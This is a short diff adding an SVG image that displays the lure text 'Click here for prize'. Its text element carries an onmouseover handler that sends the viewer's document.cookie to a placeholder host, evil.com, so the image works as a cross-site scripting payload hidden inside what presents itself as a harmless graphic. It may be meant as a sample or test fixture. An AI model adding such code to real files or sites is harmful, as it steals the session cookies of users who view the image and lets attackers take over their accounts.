@@ -1,0 +1,6 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="300" height="100">
+  <text x="10" y="40" font-size="30" fill="black"
+        onmouseover="document.location='//evil.com/steal?c='+document.cookie">
+    Click here for prize
+  </text>
+</svg>
